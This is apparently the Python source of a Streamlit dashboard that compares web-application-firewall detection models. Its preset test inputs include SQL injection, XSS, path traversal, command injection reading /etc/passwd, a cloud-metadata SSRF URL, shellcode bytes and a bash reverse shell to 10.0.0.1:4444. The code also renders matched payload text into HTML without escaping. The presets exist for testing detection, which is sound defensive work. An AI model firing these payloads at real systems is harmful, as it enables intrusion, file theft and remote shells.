"""
SecureShield WAF — Streamlit Dashboard
Hybrid Model (Burp Suite + Metasploit) always runs on the left.
Dropdown lets you pick any of the 5 individual models to compare on the right.
Side-by-side: confidence score, threats found, scan time, rules checked.
"""

import time
import streamlit as st

from waf.hybrid_model    import HybridModel
from waf.burpsuite_model import BurpSuiteModel
from waf.metasploit_model import MetasploitModel
from waf.nmap_model       import NmapModel
from waf.wireshark_model  import WiresharkModel
from waf.nikto_model      import NiktoModel

# ── Page config ───────────────────────────────────────────────────────────────
st.set_page_config(
    page_title="SecureShield WAF",
    page_icon="🛡️",
    layout="wide",
)

# ── Custom CSS ────────────────────────────────────────────────────────────────
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap');

    html, body, [class*="css"] { font-family: 'JetBrains Mono', monospace; }

    .main { background: #080c10; }

    /* Metric cards */
    [data-testid="metric-container"] {
        background: #0d1117;
        border: 1px solid rgba(255,255,255,0.08);
        border-radius: 8px;
        padding: 12px 16px;
    }

    /* Verdict banners */
    .verdict-blocked {
        background: rgba(239,68,68,0.12);
        border: 1px solid rgba(239,68,68,0.4);
        border-radius: 8px;
        padding: 14px 18px;
        color: #ef4444;
        font-weight: 700;
        font-size: 16px;
        text-align: center;
        margin-bottom: 12px;
    }
    .verdict-allowed {
        background: rgba(16,185,129,0.10);
        border: 1px solid rgba(16,185,129,0.35);
        border-radius: 8px;
        padding: 14px 18px;
        color: #10b981;
        font-weight: 700;
        font-size: 16px;
        text-align: center;
        margin-bottom: 12px;
    }

    /* Section headers */
    .model-header {
        background: #0d1117;
        border: 1px solid rgba(255,255,255,0.07);
        border-radius: 8px;
        padding: 10px 16px;
        margin-bottom: 12px;
        font-size: 13px;
    }
    .model-header-hybrid { border-left: 3px solid #00d4ff; }
    .model-header-single { border-left: 3px solid #7c3aed; }

    /* Threat rows */
    .threat-row {
        background: rgba(239,68,68,0.05);
        border: 1px solid rgba(239,68,68,0.2);
        border-radius: 6px;
        padding: 10px 14px;
        margin-bottom: 6px;
        font-size: 12px;
    }
    .threat-type { color: #f87171; font-weight: 700; font-size: 13px; }
    .threat-meta { color: #64748b; font-size: 11px; margin-top: 3px; }
    .threat-match { color: #94a3b8; font-size: 11px; font-family: monospace; margin-top: 4px; }

    /* Comparison bar */
    .comp-bar-wrap { background: #0d1117; border-radius: 6px; padding: 12px 14px; margin-bottom: 8px; border: 1px solid rgba(255,255,255,0.05); }
    .comp-bar-label { font-size: 11px; color: #64748b; margin-bottom: 5px; }
    .comp-bar-row { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
    .comp-bar-name { font-size: 11px; min-width: 120px; }
    .comp-bar-track { flex: 1; height: 8px; background: rgba(255,255,255,0.06); border-radius: 4px; overflow: hidden; }
    .comp-bar-fill { height: 100%; border-radius: 4px; }
    .comp-bar-val { font-size: 11px; min-width: 40px; text-align: right; }

    /* Score badges */
    .badge-high   { background: rgba(239,68,68,0.15);  color:#f87171; padding:2px 8px; border-radius:4px; font-size:11px; }
    .badge-medium { background: rgba(245,158,11,0.15); color:#fbbf24; padding:2px 8px; border-radius:4px; font-size:11px; }
    .badge-low    { background: rgba(16,185,129,0.12); color:#34d399; padding:2px 8px; border-radius:4px; font-size:11px; }
    .badge-none   { background: rgba(100,116,139,0.15);color:#94a3b8; padding:2px 8px; border-radius:4px; font-size:11px; }

    div[data-testid="stHorizontalBlock"] > div { gap: 0 !important; }
    .stButton>button { font-family: 'JetBrains Mono', monospace; }
</style>
""", unsafe_allow_html=True)

# ── Cached resources ──────────────────────────────────────────────────────────
@st.cache_resource
def get_hybrid():
    return HybridModel()

@st.cache_resource
def get_single_models():
    return {
        "Burp Suite":  BurpSuiteModel(),
        "Metasploit":  MetasploitModel(),
        "Nmap":        NmapModel(),
        "Wireshark":   WiresharkModel(),
        "Nikto":       NiktoModel(),
    }

hybrid  = get_hybrid()
singles = get_single_models()

# ── Header ────────────────────────────────────────────────────────────────────
st.markdown("## 🛡️ SecureShield WAF — Model Comparison Dashboard")
st.markdown(
    "**Hybrid model** (Burp Suite + Metasploit) always runs. "
    "Pick any individual model from the dropdown to compare side-by-side."
)
st.divider()

# ── Input form ────────────────────────────────────────────────────────────────
with st.expander("⚙️ Request Input + Model Selection", expanded=True):

    col_inp, col_sel = st.columns([3, 1])

    with col_inp:
        ip   = st.text_input("Source IP Address", value="192.168.1.1")
        url  = st.text_input("Request URL", value="/login")
        body = st.text_area("Request Body / Payload", value="admin' OR 1=1 --", height=120)

    with col_sel:
        st.markdown("**Compare against:**")
        selected_model_name = st.selectbox(
            "Individual model",
            options=list(singles.keys()),
            index=0,
            help="Hybrid always runs on the left. This model runs on the right.",
        )

        st.markdown("**Quick payloads:**")
        presets = {
            "SQLi classic":      ("192.168.1.1", "/login",    "' OR 1=1 --"),
            "UNION SELECT":      ("10.0.0.5",    "/api/users","1 UNION SELECT * FROM users--"),
            "XSS script":        ("172.16.0.1",  "/search",   "<script>alert('xss')</script>"),
            "Path traversal":    ("10.10.0.1",   "/file",     "../../../../etc/passwd"),
            "Cmd injection":     ("192.168.1.50","/ping",     "127.0.0.1; cat /etc/passwd"),
            "SSRF":              ("45.0.0.1",    "/fetch",    "http://169.254.169.254/latest"),
            "Metasploit shell":  ("203.0.0.1",   "/upload",   "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            "Shellcode":         ("192.168.1.9",  "/exec",    "\\x90\\x90\\x90\\x90\\xcc\\xcc\\xcc"),
            "Nikto scan":        ("45.33.32.156", "/.env",    "Apache/2.2 Server: .git/config exposed"),
            "Clean request":     ("192.168.1.200","/home",    "username=john&page=1&sort=asc"),
        }
        for label, (pip, purl, pbody) in presets.items():
            if st.button(label, key=f"preset_{label}", use_container_width=True):
                st.session_state["_ip"]   = pip
                st.session_state["_url"]  = purl
                st.session_state["_body"] = pbody
                st.rerun()

# Apply preset values if set
if "_ip"   in st.session_state: ip   = st.session_state.pop("_ip")
if "_url"  in st.session_state: url  = st.session_state.pop("_url")
if "_body" in st.session_state: body = st.session_state.pop("_body")

scan_clicked = st.button("🔍  Scan & Compare", type="primary", use_container_width=True)

# ── Run scan ──────────────────────────────────────────────────────────────────
if scan_clicked:
    request_data = {"method": "POST", "url": url, "body": body}

    # Run hybrid
    hybrid_result = hybrid.process(request_data, ip)

    # Run selected single model
    single_model = singles[selected_model_name]
    t0 = time.perf_counter()
    payload = f"POST {url} {body}"

    if hasattr(single_model, "scan"):
        single_result = single_model.scan(payload)
    else:
        single_result = single_model.analyze(payload)

    # ── Store results in session ──────────────────────────────────────────────
    st.session_state["hybrid_result"]       = hybrid_result
    st.session_state["single_result"]       = single_result
    st.session_state["selected_model_name"] = selected_model_name
    st.session_state["scanned_ip"]          = ip

# ── Results display ───────────────────────────────────────────────────────────
if "hybrid_result" in st.session_state:
    hr  = st.session_state["hybrid_result"]
    sr  = st.session_state["single_result"]
    smn = st.session_state["selected_model_name"]
    scanned_ip = st.session_state["scanned_ip"]

    st.divider()
    st.markdown("### 📊 Side-by-Side Comparison")

    # ── TOP SUMMARY BAR ───────────────────────────────────────────────────────
    def sev_badge(conf):
        if conf >= 90:  return "🔴 CRITICAL"
        if conf >= 75:  return "🟠 HIGH"
        if conf >= 50:  return "🟡 MEDIUM"
        if conf > 0:    return "🟢 LOW"
        return "✅ CLEAN"

    sum_col1, sum_col2, sum_col3, sum_col4 = st.columns(4)
    with sum_col1:
        st.metric("Hybrid verdict",   "🚫 BLOCKED" if hr["blocked"] else "✅ ALLOWED")
    with sum_col2:
        st.metric(f"{smn} verdict",   "🚫 BLOCKED" if sr["blocked"] else "✅ ALLOWED")
    with sum_col3:
        st.metric("Hybrid confidence",  f"{hr['confidence']:.1f}%")
    with sum_col4:
        st.metric(f"{smn} confidence",  f"{sr['confidence']:.1f}%")

    st.divider()

    # ── SIDE-BY-SIDE COLUMNS ─────────────────────────────────────────────────
    left, divider_col, right = st.columns([10, 1, 10])

    # ── LEFT: HYBRID ─────────────────────────────────────────────────────────
    with left:
        st.markdown(f"""
        <div class="model-header model-header-hybrid">
            🔵 <strong>Hybrid Model</strong> — Burp Suite + Metasploit<br>
            <span style="color:#64748b;font-size:11px">Misuse Detection + Exploitation Behavioral Fusion</span>
        </div>
        """, unsafe_allow_html=True)

        if hr["blocked"]:
            st.markdown('<div class="verdict-blocked">🚫 REQUEST BLOCKED</div>', unsafe_allow_html=True)
        else:
            st.markdown('<div class="verdict-allowed">✅ REQUEST ALLOWED</div>', unsafe_allow_html=True)

        m1, m2, m3, m4 = st.columns(4)
        m1.metric("Confidence",    f"{hr['confidence']:.1f}%")
        m2.metric("Threats found", hr["threat_count"])
        m3.metric("Scan time",     f"{hr['scan_time_ms']:.2f} ms")
        m4.metric("Rules checked", hr.get("rules_checked", "—"))

        # Sub-model breakdown
        if hr.get("burp_result") and hr.get("msf_result"):
            br = hr["burp_result"]
            mr = hr["msf_result"]
            st.markdown("**Sub-model breakdown:**")
            bc1, bc2 = st.columns(2)
            with bc1:
                st.markdown(f"""
                <div style='background:#0d1117;border:1px solid rgba(0,212,255,0.2);border-radius:6px;padding:10px;font-size:12px'>
                <span style='color:#00d4ff;font-weight:700'>Burp Suite</span><br>
                Threats: {br['threat_count']} &nbsp;|&nbsp; Conf: {br['confidence']}%<br>
                <span style='color:#64748b'>Time: {br['scan_time_ms']:.2f} ms</span>
                </div>""", unsafe_allow_html=True)
            with bc2:
                st.markdown(f"""
                <div style='background:#0d1117;border:1px solid rgba(124,58,237,0.3);border-radius:6px;padding:10px;font-size:12px'>
                <span style='color:#a78bfa;font-weight:700'>Metasploit</span><br>
                Threats: {mr['threat_count']} &nbsp;|&nbsp; Conf: {mr['confidence']}%<br>
                <span style='color:#64748b'>Time: {mr['scan_time_ms']:.2f} ms</span>
                </div>""", unsafe_allow_html=True)

            if hr.get("both_models_fired"):
                st.success("⚡ Both models fired — confidence boosted +5% (corroboration)")

        # Threat list
        if hr["threats"]:
            st.markdown(f"**Detected threats ({hr['threat_count']}):**")
            for t in hr["threats"]:
                badge = "badge-high" if t["confidence"] >= 90 else "badge-medium" if t["confidence"] >= 75 else "badge-low"
                st.markdown(f"""
                <div class="threat-row">
                    <div class="threat-type">{t['type']}</div>
                    <div class="threat-meta">
                        Model: <strong>{t['model']}</strong> &nbsp;|&nbsp;
                        <span class="{badge}">{t['confidence']}% confidence</span>
                    </div>
                    <div class="threat-match">Matched: <code>{t.get('matched','—')}</code></div>
                    <div class="threat-meta" style="margin-top:4px">{t.get('reason','')}</div>
                </div>""", unsafe_allow_html=True)
        else:
            st.info("No threats detected by hybrid model.")

    # ── DIVIDER ───────────────────────────────────────────────────────────────
    with divider_col:
        st.markdown(
            "<div style='width:1px;background:rgba(255,255,255,0.07);min-height:500px;margin:0 auto'></div>",
            unsafe_allow_html=True
        )

    # ── RIGHT: SINGLE MODEL ───────────────────────────────────────────────────
    with right:
        model_colors = {
            "Burp Suite": ("#00d4ff", "rgba(0,212,255,0.2)"),
            "Metasploit": ("#a78bfa", "rgba(124,58,237,0.3)"),
            "Nmap":       ("#34d399", "rgba(16,185,129,0.25)"),
            "Wireshark":  ("#60a5fa", "rgba(96,165,250,0.25)"),
            "Nikto":      ("#fb923c", "rgba(251,146,60,0.25)"),
        }
        mc, mbc = model_colors.get(smn, ("#e2e8f0","rgba(255,255,255,0.1)"))

        st.markdown(f"""
        <div class="model-header model-header-single">
            🟣 <strong>{smn}</strong><br>
            <span style="color:#64748b;font-size:11px">{sr.get('model_type','Individual Model')}</span>
        </div>
        """, unsafe_allow_html=True)

        if sr["blocked"]:
            st.markdown('<div class="verdict-blocked">🚫 REQUEST BLOCKED</div>', unsafe_allow_html=True)
        else:
            st.markdown('<div class="verdict-allowed">✅ REQUEST ALLOWED</div>', unsafe_allow_html=True)

        m1, m2, m3, m4 = st.columns(4)
        m1.metric("Confidence",    f"{sr['confidence']:.1f}%")
        m2.metric("Threats found", sr["threat_count"])
        m3.metric("Scan time",     f"{sr['scan_time_ms']:.2f} ms")
        m4.metric("Rules checked", sr.get("rules_checked", "—"))

        # Threat list
        if sr["threats"]:
            st.markdown(f"**Detected threats ({sr['threat_count']}):**")
            for t in sr["threats"]:
                badge = "badge-high" if t["confidence"] >= 90 else "badge-medium" if t["confidence"] >= 75 else "badge-low"
                st.markdown(f"""
                <div class="threat-row">
                    <div class="threat-type">{t['type']}</div>
                    <div class="threat-meta">
                        Model: <strong>{t['model']}</strong> &nbsp;|&nbsp;
                        <span class="{badge}">{t['confidence']}% confidence</span>
                    </div>
                    <div class="threat-match">Matched: <code>{t.get('matched','—')}</code></div>
                    <div class="threat-meta" style="margin-top:4px">{t.get('reason','')}</div>
                </div>""", unsafe_allow_html=True)
        else:
            st.info(f"No threats detected by {smn}.")

    # ── BOTTOM COMPARISON CHARTS ──────────────────────────────────────────────
    st.divider()
    st.markdown("### 📈 Head-to-Head Metrics")

    metrics = {
        "Confidence (%)":    (hr["confidence"],       sr["confidence"],       100),
        "Threats found":     (hr["threat_count"],     sr["threat_count"],     max(hr["threat_count"], sr["threat_count"], 1)),
        "Scan time (ms)":    (hr["scan_time_ms"],     sr["scan_time_ms"],     max(hr["scan_time_ms"], sr["scan_time_ms"], 0.01)),
        "Rules checked":     (hr.get("rules_checked",0), sr.get("rules_checked",0), max(hr.get("rules_checked",1), sr.get("rules_checked",1))),
    }

    for metric_name, (hval, sval, maxval) in metrics.items():
        hpct = round(hval / maxval * 100) if maxval else 0
        spct = round(sval / maxval * 100) if maxval else 0

        # For scan time: lower is better — flip bar direction visually
        if metric_name == "Scan time (ms)":
            hpct_bar = round((1 - hval/maxval) * 100) if maxval else 100
            spct_bar = round((1 - sval/maxval) * 100) if maxval else 100
        else:
            hpct_bar, spct_bar = hpct, spct

        st.markdown(f"""
        <div class="comp-bar-wrap">
            <div class="comp-bar-label">{metric_name}</div>
            <div class="comp-bar-row">
                <div class="comp-bar-name" style="color:#00d4ff">🔵 Hybrid</div>
                <div class="comp-bar-track">
                    <div class="comp-bar-fill" style="width:{hpct_bar}%;background:#00d4ff"></div>
                </div>
                <div class="comp-bar-val" style="color:#00d4ff">{round(hval, 2)}</div>
            </div>
            <div class="comp-bar-row">
                <div class="comp-bar-name" style="color:{mc}">🟣 {smn}</div>
                <div class="comp-bar-track">
                    <div class="comp-bar-fill" style="width:{spct_bar}%;background:{mc}"></div>
                </div>
                <div class="comp-bar-val" style="color:{mc}">{round(sval, 2)}</div>
            </div>
        </div>""", unsafe_allow_html=True)

    # Winner summary
    st.divider()
    st.markdown("### 🏆 Comparison Summary")

    w1, w2, w3 = st.columns(3)
    with w1:
        conf_winner = "Hybrid" if hr["confidence"] >= sr["confidence"] else smn
        conf_color  = "#00d4ff" if conf_winner == "Hybrid" else mc
        st.markdown(f"""
        <div style='text-align:center;padding:14px;background:#0d1117;border-radius:8px;border:1px solid rgba(255,255,255,0.07)'>
            <div style='font-size:11px;color:#64748b;margin-bottom:4px'>HIGHEST CONFIDENCE</div>
            <div style='font-size:18px;font-weight:700;color:{conf_color}'>{conf_winner}</div>
            <div style='font-size:12px;color:#64748b'>{max(hr["confidence"], sr["confidence"]):.1f}%</div>
        </div>""", unsafe_allow_html=True)

    with w2:
        threat_winner = "Hybrid" if hr["threat_count"] >= sr["threat_count"] else smn
        threat_color  = "#00d4ff" if threat_winner == "Hybrid" else mc
        st.markdown(f"""
        <div style='text-align:center;padding:14px;background:#0d1117;border-radius:8px;border:1px solid rgba(255,255,255,0.07)'>
            <div style='font-size:11px;color:#64748b;margin-bottom:4px'>MOST THREATS FOUND</div>
            <div style='font-size:18px;font-weight:700;color:{threat_color}'>{threat_winner}</div>
            <div style='font-size:12px;color:#64748b'>{max(hr["threat_count"], sr["threat_count"])} threats</div>
        </div>""", unsafe_allow_html=True)

    with w3:
        speed_winner = "Hybrid" if hr["scan_time_ms"] <= sr["scan_time_ms"] else smn
        speed_color  = "#00d4ff" if speed_winner == "Hybrid" else mc
        st.markdown(f"""
        <div style='text-align:center;padding:14px;background:#0d1117;border-radius:8px;border:1px solid rgba(255,255,255,0.07)'>
            <div style='font-size:11px;color:#64748b;margin-bottom:4px'>FASTEST SCAN</div>
            <div style='font-size:18px;font-weight:700;color:{speed_color}'>{speed_winner}</div>
            <div style='font-size:12px;color:#64748b'>{min(hr["scan_time_ms"], sr["scan_time_ms"]):.2f} ms</div>
        </div>""", unsafe_allow_html=True)

# ── Sidebar ───────────────────────────────────────────────────────────────────
with st.sidebar:
    st.markdown("### 🛡️ WAF Status")
    st.info(f"Blocked IPs: **{len(hybrid.blocked_ips)}**")
    if hybrid.blocked_ips:
        st.warning("Blocked IPs:")
        for bip in list(hybrid.blocked_ips)[-5:]:
            st.code(bip)

    st.divider()
    st.markdown("### Model Registry")
    model_info = [
        ("🔵 Hybrid",     "Burp + Metasploit",  "20 rules", "~94%"),
        ("🔴 Burp Suite", "OWASP Signatures",    "10 rules", "~88%"),
        ("🟣 Metasploit", "Exploit Patterns",    "10 rules", "~85%"),
        ("🟢 Nmap",       "Network Recon",       "8 rules",  "~80%"),
        ("🔵 Wireshark",  "Traffic Anomaly",     "8 rules",  "~78%"),
        ("🟠 Nikto",      "Server Misconfig",    "10 rules", "~82%"),
    ]
    for name, mtype, rules, acc in model_info:
        st.markdown(f"""
        **{name}**
        `{mtype}` · {rules} · acc≈{acc}
        """)

    st.divider()
    if st.button("🗑️ Clear blocked IPs", use_container_width=True):
        hybrid.blocked_ips.clear()
        st.rerun()